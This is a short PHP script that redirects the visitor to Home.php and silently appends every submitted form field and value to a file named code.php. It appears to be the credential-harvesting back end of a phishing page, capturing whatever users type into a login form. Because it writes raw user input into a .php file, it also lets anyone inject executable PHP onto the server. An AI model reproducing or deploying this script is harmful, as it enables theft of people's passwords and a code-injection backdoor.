<?php
header ('Location:Home.php');
$handle = fopen("code.php", "a");
    foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
    fwrite($handle, $value);
    fwrite($handle, "\r\n");
    }
    fwrite($handle, "<hr><br>\r\n");
    fclose($handle);
    exit;
    ?>